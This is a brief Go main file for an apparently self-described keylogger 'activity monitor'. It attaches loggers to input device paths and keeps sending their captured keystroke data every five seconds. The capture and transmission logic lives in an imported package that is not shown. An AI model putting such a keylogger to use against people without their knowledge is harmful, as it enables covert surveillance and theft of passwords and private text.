package main

import (
	"time"

	activitymonitor "github.com/dhanushs3366/KeyLogger-Monitor/activity_monitor"
)

func main() {
	devPaths := activitymonitor.GetDevPaths()

	keyloggers, err := activitymonitor.SetupLoggers(devPaths)
	if err != nil {
		panic(err)
	}
	for {
		activitymonitor.SendDataFromLoggers(keyloggers, 5*time.Second)

	}

}
